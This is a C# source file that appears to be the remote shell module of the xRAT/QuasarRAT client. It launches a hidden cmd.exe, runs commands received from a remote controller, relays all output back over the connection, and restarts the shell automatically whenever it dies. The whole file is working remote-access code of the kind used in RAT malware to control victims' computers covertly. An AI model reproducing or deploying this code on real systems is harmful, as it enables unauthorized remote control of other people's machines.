using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace xClient.Core.RemoteShell
{
    public class Shell : IDisposable
    {
        private Process _prc;
        private bool _read;

        // This ManualResetEvent will signal when we are allowed to read the standard
        // error output stream from the shell (after we are done reading the standard
        // output). Reading the standard output and the standard error output at the
        // same time will cause a deadlock.
        private ManualResetEvent redirectOutputEvent = new ManualResetEvent(false);

        private ManualResetEvent redirectStandardErrorEvent = new ManualResetEvent(true);

        private void CreateSession()
        {
            _read = true;
            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = "/K"
                }
            };

            _prc.Start();
            
            // Queue up the threads.
            RedirectOutputs();

            Thread.Sleep(100);

            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(
                Program.ConnectClient);
        }

        private void RedirectOutputs()
        {
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
        }

        private void RedirectStandardOutput()
        {
            try
            {
                using (var reader = _prc.StandardOutput)
                {
                    while (!reader.EndOfStream && _read)
                    {
                        // If we are reading the standard error output, just wait.
                        redirectStandardErrorEvent.WaitOne();
                        redirectOutputEvent.Set();
                        
                        var read = reader.ReadLine();
                        if (!string.IsNullOrEmpty(read))
                        {
                            Thread.Sleep(200);
                            new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine).Execute(Program.ConnectClient);
                        }

                        redirectOutputEvent.Reset();
                    }
                }

                if ((_prc == null || _prc.HasExited) && _read)
                    throw new ApplicationException("session unexpectedly closed");
            }
            catch (ApplicationException)
            {
                // Reset the states...
                redirectOutputEvent.Set();
                redirectStandardErrorEvent.Reset();

                new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                    .Execute(Program.ConnectClient);

                CreateSession();
            }
        }

        private void RedirectStandardError()
        {
            try
            {
                using (var reader = _prc.StandardError)
                {
                    while (!reader.EndOfStream && _read)
                    {
                        // Wait for your turn! ;)
                        redirectOutputEvent.WaitOne();
                        redirectStandardErrorEvent.Reset();

                        var read = reader.ReadLine();
                        if (!string.IsNullOrEmpty(read))
                        {
                            Thread.Sleep(200);
                            new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine, true).Execute(Program.ConnectClient);
                        }

                        redirectStandardErrorEvent.Set();
                    }
                }

                if ((_prc == null || _prc.HasExited) && _read)
                    throw new ApplicationException("session unexpectedly closed");
            }
            catch (ApplicationException)
            {
                // Reset the states...
                redirectOutputEvent.Set();
                redirectStandardErrorEvent.Reset();

                new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                    .Execute(Program.ConnectClient);

                CreateSession();
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
                CreateSession();

            if (_prc == null) return false;

            _prc.StandardInput.WriteLine(command);
            _prc.StandardInput.Flush();

            return true;
        }

        public Shell()
        {
            CreateSession();
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    _read = false;
                    if (_prc != null)
                    {
                        if (!_prc.HasExited)
                        {
                            try
                            {
                                _prc.Kill();
                            }
                            catch
                            { }
                        }
                        _prc.Dispose();
                        _prc = null;
                    }
                    GC.SuppressFinalize(this);
                }
                catch
                {
                }
            }
        }
    }
}